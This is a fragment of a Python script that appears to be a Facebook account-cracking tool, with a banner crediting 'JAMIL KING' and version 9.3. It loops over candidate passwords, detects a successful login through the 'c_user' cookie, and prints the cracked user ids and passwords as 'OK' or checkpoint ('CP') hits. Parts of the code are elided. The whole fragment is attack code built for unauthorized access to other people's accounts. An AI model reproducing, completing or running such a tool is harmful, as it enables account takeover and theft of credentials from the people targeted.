...
logo=("""
        ...
        xeee      .--~*teu.        .n~~%x.     
       d888R     dF     988Nx    x88X   888.   
      d8888R    d888b   `8888>  X888X   8888L  
     @ 8888R    ?8888>  98888F X8888X   88888  
   .P  8888R     "**"  x88888~ 88888X   88888X 
  :F   8888R          d8888*`  88888X   88888X 
 x"    8888R        z8**"`   : 88888X   88888f 
d8eeeee88888eer   :?.....  ..F 48888X   88888  
       8888R     <""888888888~  ?888X   8888"  
       8888R     8:  "888888*    "88X   88*`   
    "*%%%%%%**~  ""    "**"`       ^"==="`    
\33[1;37m----------------------------------------------
→   Owner      :   JAMIL KING 💪
→   Facebook   :  JAMIL VISAL HKR
→   Github     : VISAL AFG HKR
  →   Tools   :  FREE
\x1b[1;97m→   Version    :  9.3
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ JAMIL AFG HKR-OK] '+cid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[JAMIL.AFG HKR-CP] '+uid+' | '+ps+'\x1b[1;97m')
